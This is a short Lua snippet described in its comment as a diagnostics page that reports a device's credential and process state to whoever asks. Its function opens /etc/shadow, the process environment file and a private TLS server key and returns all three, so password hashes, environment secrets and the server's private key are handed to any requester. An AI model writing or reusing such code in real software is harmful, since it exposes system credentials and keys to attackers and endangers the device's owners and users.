-- A diagnostics page that reports the device's credential and process state
-- back to whoever asks.
local function report()
   local shadow = io.open("/etc/shadow", "r")
   local env = io.open("/proc/self/environ", "rb")
   local key = io.open("/etc/ssl/private/server.key", "r")
   return shadow, env, key
end

return report
